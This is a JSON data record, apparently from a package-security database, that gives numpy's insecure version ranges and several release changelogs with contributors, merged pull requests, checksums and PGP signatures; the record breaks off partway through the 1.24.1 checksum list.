[{"name": "numpy", "insecurity": ["<1.13.2", "<1.16.3", "<1.21.0rc1", "<1.22.0", "<1.22.2", "<1.8.1"], "changelog": {"1.17.5": "==========================\n\nThis release contains fixes for bugs reported against NumPy 1.17.4 along with\nsome build improvements. The Python versions supported in this release\nare 3.5-3.8.\n\nDownstream developers should use Cython >= 0.29.14 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid errors on the Skylake architecture.\n\nIt is recommended that developers interested in the new random bit generators\nupgrade to the NumPy 1.18.x series, as it has updated documentation and\nmany small improvements.\n\n\nContributors\n\nA total of 6 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\nCharles Harris\nEric Wieser\nIlhan Polat\nMatti Picus\nMichael Hudson-Doyle\nRalf Gommers\n\n\nPull requests merged\n\nA total of 8 pull requests were merged for this release.\n\n`14593 <https://github.com/numpy/numpy/pull/14593>`__: MAINT: backport Cython API cleanup to 1.17.x, remove docs\n`14937 <https://github.com/numpy/numpy/pull/14937>`__: BUG: fix integer size confusion in handling array's ndmin argument\n`14939 <https://github.com/numpy/numpy/pull/14939>`__: BUILD: remove SSE2 flag from numpy.random builds\n`14993 <https://github.com/numpy/numpy/pull/14993>`__: MAINT: Added Python3.8 branch to dll lib discovery\n`15038 <https://github.com/numpy/numpy/pull/15038>`__: BUG: Fix refcounting in ufunc object loops\n`15067 <https://github.com/numpy/numpy/pull/15067>`__: BUG: Exceptions tracebacks are dropped\n`15175 <https://github.com/numpy/numpy/pull/15175>`__: ENH: Backport improvements to testing functions.\n`15213 <https://github.com/numpy/numpy/pull/15213>`__: REL: Prepare for the NumPy 1.17.5 release.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    e1d378317e20e340ea46937cbaf45094  numpy-1.17.5-cp35-cp35m-macosx_10_9_intel.whl\n    49b263605ab32a0880fa68b29c2586b0  numpy-1.17.5-cp35-cp35m-manylinux1_i686.whl\n    41b4800ea0b8410919500e264994fb6f  numpy-1.17.5-cp35-cp35m-manylinux1_x86_64.whl\n    7ac18d112a745aabf5059da85de91c57  numpy-1.17.5-cp35-cp35m-win32.whl\n    98dfbe821c010b34771f789dff36ca76  numpy-1.17.5-cp35-cp35m-win_amd64.whl\n    3a14d2a58b72db3020b2d1760aefed5c  numpy-1.17.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    47810aa1c34d9d46581f0b8dee0d1acc  numpy-1.17.5-cp36-cp36m-manylinux1_i686.whl\n    e0f2d037ecd1ecbfa5f3d282bf69fad2  numpy-1.17.5-cp36-cp36m-manylinux1_x86_64.whl\n    addda5c691eaca7b8aa2f8413c936f54  numpy-1.17.5-cp36-cp36m-win32.whl\n    ee5c057451e77ad2aeb1a7ed2df3754d  numpy-1.17.5-cp36-cp36m-win_amd64.whl\n    8be28f068e0b2e9c5202debd6e2bcf6c  numpy-1.17.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    8400685497628c48b292ff8bb8b7286e  numpy-1.17.5-cp37-cp37m-manylinux1_i686.whl\n    a399036176dd2e23e07b866b460b6f20  numpy-1.17.5-cp37-cp37m-manylinux1_x86_64.whl\n    f9497454c4d3a8fdcc62788420f365c7  numpy-1.17.5-cp37-cp37m-win32.whl\n    930a172f90ea6658adf2d25700a98757  numpy-1.17.5-cp37-cp37m-win_amd64.whl\n    1fddb7a3de3aba553614919411e70698  numpy-1.17.5-cp38-cp38-macosx_10_9_x86_64.whl\n    003e1514a5ed31cebb10a8055f7b63e6  numpy-1.17.5-cp38-cp38-manylinux1_i686.whl\n    de8f5f3f602f889fb0ed42cfd5da40bc  numpy-1.17.5-cp38-cp38-manylinux1_x86_64.whl\n    91a89b84875f30f6b8166d4791212aa3  numpy-1.17.5-cp38-cp38-win32.whl\n    ba5eb1d2705e4a169df105ce7a95abc0  numpy-1.17.5-cp38-cp38-win_amd64.whl\n    59d27965e42caedf8913ebe03cf36f87  numpy-1.17.5.tar.gz\n    763a5646fa6eef7a22f4895bca0524f2  numpy-1.17.5.zip\n\nSHA256\n------\n::\n\n    d977a91f7b02b14843562d2e8740acfdfb46996e64985b69b2d404bfa43bc07d  numpy-1.17.5-cp35-cp35m-macosx_10_9_intel.whl\n    6c6cab8089ad39554d7fed04d338e7bd7ea6ac48235a542ea0b37214c8d0a9bc  numpy-1.17.5-cp35-cp35m-manylinux1_i686.whl\n    4760bcc6adaf0d853379d01ce60f320e5ab6d0d719662aef3c460dad3cf79989  numpy-1.17.5-cp35-cp35m-manylinux1_x86_64.whl\n    c3fb7eb84cd455ea2294980e557cc40b0042f7fc7ebab28c74ccae85c8b0c2c4  numpy-1.17.5-cp35-cp35m-win32.whl\n    6167d214a842610d4168311d803f2a6f2c1a9a866b6b370f7408ba508d265add  numpy-1.17.5-cp35-cp35m-win_amd64.whl\n    ca43581440ce2585f83c8d524c3435569b212bf281b7c67395e78260fcffb341  numpy-1.17.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    5347fc1258ebe501d352363da06229fc97785d67423b56a9fd032a8389355781  numpy-1.17.5-cp36-cp36m-manylinux1_i686.whl\n    1739f079e2fcc985cc187aa3ce489d127a02ff12bcc5178269bb7ce5dc860e8f  numpy-1.17.5-cp36-cp36m-manylinux1_x86_64.whl\n    af51bc1d78ddc1588115b73a1d3824440f5cf55c498681e8ac4ab2f28f0efa99  numpy-1.17.5-cp36-cp36m-win32.whl\n    259b5aa0a1d2e63bbe9d985bc8249b515541b9993e1b1540563428f5db7bc389  numpy-1.17.5-cp36-cp36m-win_amd64.whl\n    8ba8ef37b16288dd2390cd9dea3c8470436f6cfe4c665f4640c349e98bae2908  numpy-1.17.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    348efb76a26f9f3235e492813503639731a885aa5780579ee28d688607d188b2  numpy-1.17.5-cp37-cp37m-manylinux1_i686.whl\n    31db2f9604afbf897b23478942074bbbb2513467d2b4b4ac573a7b65c63c073c  numpy-1.17.5-cp37-cp37m-manylinux1_x86_64.whl\n    68bdc37f3ccdc3e945914b3201acd8823ac9dec870ede5371cd5cfedcf5a901a  numpy-1.17.5-cp37-cp37m-win32.whl\n    15db548aade41e32bfb6f6d3d9e91797261197622afe4102f79220d17da2a29f  numpy-1.17.5-cp37-cp37m-win_amd64.whl\n    fc56ec046a2cc3aba91fe29e482c145c17925db1b00eafa924d9e16020a3eb88  numpy-1.17.5-cp38-cp38-macosx_10_9_x86_64.whl\n    73d20aebe518997dce89da356d4b8e4cf60143151c22a0ec76cb00840bb09320  numpy-1.17.5-cp38-cp38-manylinux1_i686.whl\n    aa3dd92c1427e032fe345f054503f45c9fc7883aa7156a60900641259dd78a78  numpy-1.17.5-cp38-cp38-manylinux1_x86_64.whl\n    6338f8fa99ea0b00944a256941eea406089a9c0242f594b69289edd91e2d6192  numpy-1.17.5-cp38-cp38-win32.whl\n    14804866e57322bf601c966e428c271b7e301b631bdfbe0522800483b802bc58  numpy-1.17.5-cp38-cp38-win_amd64.whl\n    ef0801b6feca0f50e56c29b02e0f3e2c8c40963d44c38484e6f47bfcfbf17d32  numpy-1.17.5.tar.gz\n    16507ba6617f62ae3c6ab1725ae6f550331025d4d9a369b83f6d5a470446c342  numpy-1.17.5.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n==========================\n", "1.17.1": "==========================\n\nThis release contains a number of fixes for bugs reported against NumPy 1.17.0\nalong with a few documentation and build improvements.  The Python versions\nsupported are 3.5-3.7, note that Python 2.7 has been dropped.  Python 3.8b3\nshould work with the released source packages, but there are no future\nguarantees.\n\nDownstream developers should use Cython >= 0.29.13 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid problems on the Skylake architecture. The NumPy wheels\non PyPI are built from the OpenBLAS development branch in order to avoid those\nproblems.\n\n\nContributors\n============\n\nA total of 17 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Alexander Jung +\n* Allan Haldane\n* Charles Harris\n* Eric Wieser\n* Giuseppe Cuccu +\n* Hiroyuki V. Yamazaki\n* J\u00e9r\u00e9mie du Boisberranger\n* Kmol Yuan +\n* Matti Picus\n* Max Bolingbroke +\n* Maxwell Aladago +\n* Oleksandr Pavlyk\n* Peter Andreas Entschev\n* Sergei Lebedev\n* Seth Troisi +\n* Vladimir Pershin +\n* Warren Weckesser\n\n\nPull requests merged\n====================\n\nA total of 24 pull requests were merged for this release.\n\n* `14156 <https://github.com/numpy/numpy/pull/14156>`__: TST: Allow fuss in testing strided/non-strided exp/log loops\n* `14157 <https://github.com/numpy/numpy/pull/14157>`__: BUG: avx2_scalef_ps must be static\n* `14158 <https://github.com/numpy/numpy/pull/14158>`__: BUG: Remove stray print that causes a SystemError on python 3.7.\n* `14159 <https://github.com/numpy/numpy/pull/14159>`__: BUG: Fix DeprecationWarning in python 3.8.\n* `14160 <https://github.com/numpy/numpy/pull/14160>`__: BLD: Add missing gcd/lcm definitions to npy_math.h\n* `14161 <https://github.com/numpy/numpy/pull/14161>`__: DOC, BUILD: cleanups and fix (again) 'build dist'\n* `14166 <https://github.com/numpy/numpy/pull/14166>`__: TST: Add 3.8-dev to travisCI testing.\n* `14194 <https://github.com/numpy/numpy/pull/14194>`__: BUG: Remove the broken clip wrapper (Backport)\n* `14198 <https://github.com/numpy/numpy/pull/14198>`__: DOC: Fix hermitian argument docs in svd.\n* `14199 <https://github.com/numpy/numpy/pull/14199>`__: MAINT: Workaround for Intel compiler bug leading to failing test\n* `14200 <https://github.com/numpy/numpy/pull/14200>`__: TST: Clean up of test_pocketfft.py\n* `14201 <https://github.com/numpy/numpy/pull/14201>`__: BUG: Make advanced indexing result on read-only subclass writeable...\n* `14236 <https://github.com/numpy/numpy/pull/14236>`__: BUG: Fixed default BitGenerator name\n* `14237 <https://github.com/numpy/numpy/pull/14237>`__: ENH: add c-imported modules for freeze analysis in np.random\n* `14296 <https://github.com/numpy/numpy/pull/14296>`__: TST: Pin pytest version to 5.0.1\n* `14301 <https://github.com/numpy/numpy/pull/14301>`__: BUG: Fix leak in the f2py-generated module init and `PyMem_Del`...\n* `14302 <https://github.com/numpy/numpy/pull/14302>`__: BUG: Fix formatting error in exception message\n* `14307 <https://github.com/numpy/numpy/pull/14307>`__: MAINT: random: Match type of SeedSequence.pool_size to DEFAULT_POOL_SIZE.\n* `14308 <https://github.com/numpy/numpy/pull/14308>`__: BUG: Fix numpy.random bug in platform detection\n* `14309 <https://github.com/numpy/numpy/pull/14309>`__: ENH: Enable huge pages in all Linux builds\n* `14330 <https://github.com/numpy/numpy/pull/14330>`__: BUG: Fix segfault in `random.permutation(x)` when x is a string.\n* `14338 <https://github.com/numpy/numpy/pull/14338>`__: BUG: don't fail when lexsorting some empty arrays (#14228)\n* `14339 <https://github.com/numpy/numpy/pull/14339>`__: BUG: Fix misuse of .names and .fields in various places (backport...\n* `14345 <https://github.com/numpy/numpy/pull/14345>`__: BUG: fix behavior of structured_to_unstructured on non-trivial...\n* `14350 <https://github.com/numpy/numpy/pull/14350>`__: REL: Prepare 1.17.1 release\n\nChecksums\n=========\n\nMD5\n- ---\n\n    99708c771ef1efe283ecfd6e30698e1a  numpy-1.17.1-cp35-cp35m-macosx_10_9_x86_64.whl\n    5547039914b3f9541137e8cd9fab57c7  numpy-1.17.1-cp35-cp35m-manylinux1_i686.whl\n    b24c5726f07d5f71d244baaa513af920  numpy-1.17.1-cp35-cp35m-manylinux1_x86_64.whl\n    55070ccaeabbe5036c5a577f4e4cc2b0  numpy-1.17.1-cp35-cp35m-win32.whl\n    086a59eab8e5b8ebbf10755b8a2db677  numpy-1.17.1-cp35-cp35m-win_amd64.whl\n    a7d523ddbe70107016026da5474b7245  numpy-1.17.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    794d982a831762918eba7fa5cf8f16e8  numpy-1.17.1-cp36-cp36m-manylinux1_i686.whl\n    c50ee655b018c315e75a8cb40c771225  numpy-1.17.1-cp36-cp36m-manylinux1_x86_64.whl\n    e1b9c4c90df2b84674dbd6c3875d44b1  numpy-1.17.1-cp36-cp36m-win32.whl\n    0799ddcbb5d28d789d613558bce33b30  numpy-1.17.1-cp36-cp36m-win_amd64.whl\n    7e723a8f451eaa091f09a4df09bdf776  numpy-1.17.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    c4c09c737c19d86829e4f2268d2c8991  numpy-1.17.1-cp37-cp37m-manylinux1_i686.whl\n    c711188365a7677334ddc754778d4822  numpy-1.17.1-cp37-cp37m-manylinux1_x86_64.whl\n    dddef61754e2ddb46cce6a1656d35eb4  numpy-1.17.1-cp37-cp37m-win32.whl\n    5e022462aedaac5e9d7f5b09a8f7e3bb  numpy-1.17.1-cp37-cp37m-win_amd64.whl\n    b2260d650bc28c846e18b7c29a089953  numpy-1.17.1.tar.gz\n    cad292965675fbe8d5fbae3009ab8b58  numpy-1.17.1.zip\n\nSHA256\n- ------\n\n    078c8025da5ab9e8657edc9c2a1e9642e06e953bc7baa2e65c1aa9d9dfb7e98b  numpy-1.17.1-cp35-cp35m-macosx_10_9_x86_64.whl\n    a3f6b3024f8826d8b1490e6e2a9b99e841cd2c375791b1df62991bd8f4c00b89  numpy-1.17.1-cp35-cp35m-manylinux1_i686.whl\n    bede70fd8699695363f39e86c1e869b2c8b74fb5ef135a67b9e1eeebff50322a  numpy-1.17.1-cp35-cp35m-manylinux1_x86_64.whl\n    1c841033f4fe6801648180c3033c45b3235a8bbd09bc7249010f99ea27bb6790  numpy-1.17.1-cp35-cp35m-win32.whl\n    03f2ebcbffcce2dec8860633b89a93e80c6a239d21a77ae8b241450dc21e8c35  numpy-1.17.1-cp35-cp35m-win_amd64.whl\n    c304b2221f33489cd15a915237a84cdfe9420d7e4d4828c78a0820f9d990395c  numpy-1.17.1-cp36-cp36m-macosx_10_9_x86_64.whl\n    0fbfa98c5d5c3c6489cc1e852ec94395d51f35d9ebe70c6850e47f465038cdf4  numpy-1.17.1-cp36-cp36m-manylinux1_i686.whl\n    fb6178b0488b0ce6a54bc4accbdf5225e937383586555604155d64773f6beb2b  numpy-1.17.1-cp36-cp36m-manylinux1_x86_64.whl\n    2c0984a01ddd0aeec89f0ce46ef21d64761048cd76c0074d0658c91f9131f154  numpy-1.17.1-cp36-cp36m-win32.whl\n    8c2d98d0623bd63fb883b65256c00454d5f53127a5a7bcdaa8bdc582814e8cb4  numpy-1.17.1-cp36-cp36m-win_amd64.whl\n    8cb4b6ae45aad6d26712a1ce0a3f2556c5e1484867f9649e03496e45d6a5eba4  numpy-1.17.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    4c166dcb0fff7cb3c0bbc682dfb5061852a2547efb6222e043a7932828c08fb5  numpy-1.17.1-cp37-cp37m-manylinux1_i686.whl\n    93050e73c446c82065b7410221b07682e475ac51887cd9368227a5d944afae80  numpy-1.17.1-cp37-cp37m-manylinux1_x86_64.whl\n    fa5f2a8ef1e07ba258dc07d4dd246de23ef4ab920ae0f3fa2a1cc5e90f0f1888  numpy-1.17.1-cp37-cp37m-win32.whl\n    fd5e830d4dc31658d61a6452cd3e842213594d8c15578cdae6829e36ad9c0930  numpy-1.17.1-cp37-cp37m-win_amd64.whl\n    24d479ebc92f2d1c739622568f0e4d1382c6bf9778505146a370c8e2f5749839  numpy-1.17.1.tar.gz\n    f11331530f0eff69a758d62c2461cd98cdc2eae0147279d8fc86e0464eb7e8ca  numpy-1.17.1.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl1kdIkACgkQZ58ig3fF\nJHvVEAf/WdyQP9SHOheq3uYLwH9COh+PZd5Gdbrexlwvs20GO4rxWhZ06Aymei2n\n+fW1luoemjmPO71Wp2o3Z1AdDDkgHkISPh2U1codwzgek+pRyPHBa3149c9mZN2U\nI9DrkOdS2SYx+9V9BBBLVzCTtdfK6vVxbM7e8n21BWnhhAeSHaSae35IFNGZPRWa\n3h05YOHQ4JDepxpzxvPziM0ruHuCFI7V1Lq7kt8ZMh/gh5ciedVgKu45bckG8MAf\n+n/d4KatMXszKkBBT2T4zEwMOrGwZoQdU2KnH2DN0sXjrbxGJ/6FUV4rB8A+iEUO\nuAH92c/io7yqGs7KM+5TyJAv3oXG3A==\n=1urn\n-----END PGP SIGNATURE-----\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.15.4": "==========================\n\nThis is a bugfix release for bugs and regressions reported following the 1.15.3\nrelease.  The Python versions supported by this release are 2.7, 3.4-3.7. The\nwheels are linked with OpenBLAS v0.3.0, which should fix some of the linalg\nproblems reported for NumPy 1.14.\n\nCompatibility Note\n==================\n\nThe NumPy 1.15.x OS X wheels released on PyPI no longer contain 32-bit\nbinaries.  That will also be the case in future releases. See\n`11625 <https://github.com/numpy/numpy/issues/11625>`__ for the related\ndiscussion.  Those needing 32-bit support should look elsewhere or build\nfrom source.\n\nContributors\n============\n\nA total of 4 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matti Picus\n* Sebastian Berg\n* bbbbbbbbba +\n\nPull requests merged\n====================\n\nA total of 4 pull requests were merged for this release.\n\n* `12296 <https://github.com/numpy/numpy/pull/12296>`__: BUG: Dealloc cached buffer info\n* `12297 <https://github.com/numpy/numpy/pull/12297>`__: BUG: Fix fill value in masked array '==' and '!=' ops.\n* `12307 <https://github.com/numpy/numpy/pull/12307>`__: DOC: Correct the default value of `optimize` in `numpy.einsum`\n* `12320 <https://github.com/numpy/numpy/pull/12320>`__: REL: Prepare for the NumPy 1.15.4 release\n\nChecksums\n=========\n\nMD5\n- ---\n\n    277c501cfcc67767d73d83a53ba69ecb  numpy-1.15.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    4c687d8cd7833e0b549d4a20905f29a2  numpy-1.15.4-cp27-cp27m-manylinux1_i686.whl\n    988d0b321d0b7576b105528fc948ddc3  numpy-1.15.4-cp27-cp27m-manylinux1_x86_64.whl\n    ea6bd39d05539847a0ebb12ff955251a  numpy-1.15.4-cp27-cp27mu-manylinux1_i686.whl\n    8ef2d1ea4571cdd0e7e8dfd5128436b4  numpy-1.15.4-cp27-cp27mu-manylinux1_x86_64.whl\n    b550d4cc012623a0c38f1392e08f4805  numpy-1.15.4-cp27-none-win32.whl\n    cb38e4778d9db33199dc7bb6a69ce089  numpy-1.15.4-cp27-none-win_amd64.whl\n    fa0acf5b2f852454346df5486a4ff4d9  numpy-1.15.4-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a7614f6318899aa1bfbc337232c4647f  numpy-1.15.4-cp34-cp34m-manylinux1_i686.whl\n    ae16e02274996ff926a30f23f6d6d7e8  numpy-1.15.4-cp34-cp34m-manylinux1_x86_64.whl\n    c1e1f381de7abc96509d4c5463903755  numpy-1.15.4-cp34-none-win32.whl\n    c269c8f2fce6cefdffe5e3821fc04fb5  numpy-1.15.4-cp34-none-win_amd64.whl\n    8906282c374b9b008c5c6401e5dc750b  numpy-1.15.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    537949e404ecc5814cb0db534bdfef36  numpy-1.15.4-cp35-cp35m-manylinux1_i686.whl\n    3b10a2fcf8610bbbfe08161e1d9d176e  numpy-1.15.4-cp35-cp35m-manylinux1_x86_64.whl\n    b67621a1c9b8dcac707ca22055629e9f  numpy-1.15.4-cp35-none-win32.whl\n    25b45b69d624cb07a8c05a5f82779b0a  numpy-1.15.4-cp35-none-win_amd64.whl\n    76ed46a4d4e9cdb7076bf1359d9df1d4  numpy-1.15.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    b98cbad7770856dc12c827dca7c201b4  numpy-1.15.4-cp36-cp36m-manylinux1_i686.whl\n    6293fa6db83849aab3a8b1a606cf3d03  numpy-1.15.4-cp36-cp36m-manylinux1_x86_64.whl\n    21df485f92248c13cab3838762d717f6  numpy-1.15.4-cp36-none-win32.whl\n    c9cf7a267f8d2f57dc6384cc8b9f5acf  numpy-1.15.4-cp36-none-win_amd64.whl\n    1f6990e094c6b2bb47c6a528ac7b1263  numpy-1.15.4-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    e79239cd9a3ce3cbfa5e7345bfb2ca56  numpy-1.15.4-cp37-cp37m-manylinux1_i686.whl\n    fc046ba978ef4dd0556af09643c57d30  numpy-1.15.4-cp37-cp37m-manylinux1_x86_64.whl\n    6291159933eb5a7f9c0bf28ae9707739  numpy-1.15.4-cp37-none-win32.whl\n    6097910d675f9e81d5d131b91a6c5c61  numpy-1.15.4-cp37-none-win_amd64.whl\n    b3626fec2f39ab01cad8bbb63a103742  numpy-1.15.4.tar.gz\n    219ac537d12cf06ed14f478662096ebc  numpy-1.15.4.zip\n\nSHA256\n- ------\n\n    18e84323cdb8de3325e741a7a8dd4a82db74fde363dce32b625324c7b32aa6d7  numpy-1.15.4-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    154c35f195fd3e1fad2569930ca51907057ae35e03938f89a8aedae91dd1b7c7  numpy-1.15.4-cp27-cp27m-manylinux1_i686.whl\n    4d8d3e5aa6087490912c14a3c10fbdd380b40b421c13920ff468163bc50e016f  numpy-1.15.4-cp27-cp27m-manylinux1_x86_64.whl\n    c857ae5dba375ea26a6228f98c195fec0898a0fd91bcf0e8a0cae6d9faf3eca7  numpy-1.15.4-cp27-cp27mu-manylinux1_i686.whl\n    0df89ca13c25eaa1621a3f09af4c8ba20da849692dcae184cb55e80952c453fb  numpy-1.15.4-cp27-cp27mu-manylinux1_x86_64.whl\n    36e36b6868e4440760d4b9b44587ea1dc1f06532858d10abba98e851e154ca70  numpy-1.15.4-cp27-none-win32.whl\n    99d59e0bcadac4aa3280616591fb7bcd560e2218f5e31d5223a2e12a1425d495  numpy-1.15.4-cp27-none-win_amd64.whl\n    edfa6fba9157e0e3be0f40168eb142511012683ac3dc82420bee4a3f3981b30e  numpy-1.15.4-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    b261e0cb0d6faa8fd6863af26d30351fd2ffdb15b82e51e81e96b9e9e2e7ba16  numpy-1.15.4-cp34-cp34m-manylinux1_i686.whl\n    db9814ff0457b46f2e1d494c1efa4111ca089e08c8b983635ebffb9c1573361f  numpy-1.15.4-cp34-cp34m-manylinux1_x86_64.whl\n    df04f4bad8a359daa2ff74f8108ea051670cafbca533bb2636c58b16e962989e  numpy-1.15.4-cp34-none-win32.whl\n    7da99445fd890206bfcc7419f79871ba8e73d9d9e6b82fe09980bc5bb4efc35f  numpy-1.15.4-cp34-none-win_amd64.whl\n    56994e14b386b5c0a9b875a76d22d707b315fa037affc7819cda08b6d0489756  numpy-1.15.4-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ecf81720934a0e18526177e645cbd6a8a21bb0ddc887ff9738de07a1df5c6b61  numpy-1.15.4-cp35-cp35m-manylinux1_i686.whl\n    cf5bb4a7d53a71bb6a0144d31df784a973b36d8687d615ef6a7e9b1809917a9b  numpy-1.15.4-cp35-cp35m-manylinux1_x86_64.whl\n    561ef098c50f91fbac2cc9305b68c915e9eb915a74d9038ecf8af274d748f76f  numpy-1.15.4-cp35-none-win32.whl\n    4f41fd159fba1245e1958a99d349df49c616b133636e0cf668f169bce2aeac2d  numpy-1.15.4-cp35-none-win_amd64.whl\n    416a2070acf3a2b5d586f9a6507bb97e33574df5bd7508ea970bbf4fc563fa52  numpy-1.15.4-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    24fd645a5e5d224aa6e39d93e4a722fafa9160154f296fd5ef9580191c755053  numpy-1.15.4-cp36-cp36m-manylinux1_i686.whl\n    23557bdbca3ccbde3abaa12a6e82299bc92d2b9139011f8c16ca1bb8c75d1e95  numpy-1.15.4-cp36-cp36m-manylinux1_x86_64.whl\n    b1853df739b32fa913cc59ad9137caa9cc3d97ff871e2bbd89c2a2a1d4a69451  numpy-1.15.4-cp36-none-win32.whl\n    73a1f2a529604c50c262179fcca59c87a05ff4614fe8a15c186934d84d09d9a5  numpy-1.15.4-cp36-none-win_amd64.whl\n    1e8956c37fc138d65ded2d96ab3949bd49038cc6e8a4494b1515b0ba88c91565  numpy-1.15.4-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    a4cc09489843c70b22e8373ca3dfa52b3fab778b57cf81462f1203b0852e95e3  numpy-1.15.4-cp37-cp37m-manylinux1_i686.whl\n    4a22dc3f5221a644dfe4a63bf990052cc674ef12a157b1056969079985c92816  numpy-1.15.4-cp37-cp37m-manylinux1_x86_64.whl\n    b1f44c335532c0581b77491b7715a871d0dd72e97487ac0f57337ccf3ab3469b  numpy-1.15.4-cp37-none-win32.whl\n    a61dc29cfca9831a03442a21d4b5fd77e3067beca4b5f81f1a89a04a71cf93fa  numpy-1.15.4-cp37-none-win_amd64.whl\n    766e09248298e3ad4ae4a805159f358610bbe7dcc7b4a14e5df2128c05655b80  numpy-1.15.4.tar.gz\n    3d734559db35aa3697dadcea492a423118c5c55d176da2f3be9c98d4803fc2a7  numpy-1.15.4.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJb3xldAAoJEGefIoN3xSR7cN8H/0p2O4q0wPKh5PEEC/dxPVFN\n+xZxqWS4PLgj9cdZp+F1UdQQpdnoE0CYPdKXRCpZS0u2BKi/HYCrSOaZn6tt2vXX\nSHPFMn3T78U5FuFth7Q6BBpFs3JGW4baxpcLltiT3OLLGim4FkD7iRJtzs0On3nN\nnxGwewhp2MaXvKRKYje7f2aeciGum5/mM5wtBojAjwDptIVlyqYXY0HEcq8/Vg8x\n3+rjku/V6wvXuVocWzGEjBIuirUcag3ygMqbO7PqaYThB+/hpLTstl0G8MorUKtG\nkZdCiwt5hM9EQJwYHWEAK/oAlOVIUyBxxcd+3Q44B90V5c80/xaiDjqWxTDqkfw=\n=+jjY\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.24.1": "==========================\nNumPy 1.24.1 is a maintenance release that fixes bugs and regressions discovered after the\n1.24.0 release. The Python versions supported by this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 12 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Andrew Nelson\n* Ben Greiner +\n* Charles Harris\n* Cl\u00e9ment Robert\n* Matteo Raso\n* Matti Picus\n* Melissa Weber Mendon\u00e7a\n* Miles Cranmer\n* Ralf Gommers\n* Rohit Goswami\n* Sayed Adel\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 18 pull requests were merged for this release.\n\n* `22820 <https://github.com/numpy/numpy/pull/22820>`__: BLD: add workaround in setup.py for newer setuptools\n* `22830 <https://github.com/numpy/numpy/pull/22830>`__: BLD: CIRRUS_TAG redux\n* `22831 <https://github.com/numpy/numpy/pull/22831>`__: DOC: fix a couple typos in 1.23 notes\n* `22832 <https://github.com/numpy/numpy/pull/22832>`__: BUG: Fix refcounting errors found using pytest-leaks\n* `22834 <https://github.com/numpy/numpy/pull/22834>`__: BUG, SIMD: Fix invalid value encountered in several ufuncs\n* `22837 <https://github.com/numpy/numpy/pull/22837>`__: TST: ignore more np.distutils.log imports\n* `22839 <https://github.com/numpy/numpy/pull/22839>`__: BUG: Do not use getdata() in np.ma.masked_invalid\n* `22847 <https://github.com/numpy/numpy/pull/22847>`__: BUG: Ensure correct behavior for rows ending in delimiter in...\n* `22848 <https://github.com/numpy/numpy/pull/22848>`__: BUG, SIMD: Fix the bitmask of the boolean comparison\n* `22857 <https://github.com/numpy/numpy/pull/22857>`__: BLD: Help raspian arm + clang 13 about __builtin_mul_overflow\n* `22858 <https://github.com/numpy/numpy/pull/22858>`__: API: Ensure a full mask is returned for masked_invalid\n* `22866 <https://github.com/numpy/numpy/pull/22866>`__: BUG: Polynomials now copy properly (#22669)\n* `22867 <https://github.com/numpy/numpy/pull/22867>`__: BUG, SIMD: Fix memory overlap in ufunc comparison loops\n* `22868 <https://github.com/numpy/numpy/pull/22868>`__: BUG: Fortify string casts against floating point warnings\n* `22875 <https://github.com/numpy/numpy/pull/22875>`__: TST: Ignore nan-warnings in randomized out tests\n* `22883 <https://github.com/numpy/numpy/pull/22883>`__: MAINT: restore npymath implementations needed for freebsd\n* `22884 <https://github.com/numpy/numpy/pull/22884>`__: BUG: Fix integer overflow in in1d for mixed integer dtypes #22877\n* `22887 <https://github.com/numpy/numpy/pull/22887>`__: BUG: Use whole file for encoding checks with ``charset_normalizer``.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    9e543db90493d6a00939bd54c2012085  numpy-1.24.1-cp310-cp310-macosx_10_9_x86_64.whl\n    4ebd7af622bf617b4876087e500d7586  numpy-1.24.1-cp310-cp310-macosx_11_0_arm64.whl\n    0c0a3012b438bb455a6c2fadfb1be76a  numpy-1.24.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0bddb527345449df624d3cb9aa0e1b75  